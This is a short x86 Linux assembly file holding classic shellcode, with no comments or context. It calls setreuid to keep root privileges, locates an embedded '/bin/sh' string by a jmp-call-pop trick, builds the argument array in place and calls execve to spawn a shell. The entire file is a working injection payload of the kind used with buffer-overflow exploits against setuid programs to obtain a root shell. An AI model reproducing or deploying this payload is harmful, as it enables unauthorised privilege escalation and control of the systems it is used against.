.section .data
.globl _start

_start:
	xor			%eax, %eax
	xor			%ebx, %ebx
	xor			%ecx, %ecx
	movb		$70, %al
	int			$0x80
	jmp			getaddr
back:
	pop			%ebx
	xor			%eax, %eax
	movb		%al, 7(%ebx)
	movl		%ebx, 8(%ebx)
	movl		%eax, 12(%ebx)
	xor			%eax, %eax
	movb		$11, %al
	leal		8(%ebx), %ecx
	leal		12(%ebx), %edx
	int			$0x80
getaddr:
	call		back
shell:
	.ascii		"/bin/shNSSSSNNNN"

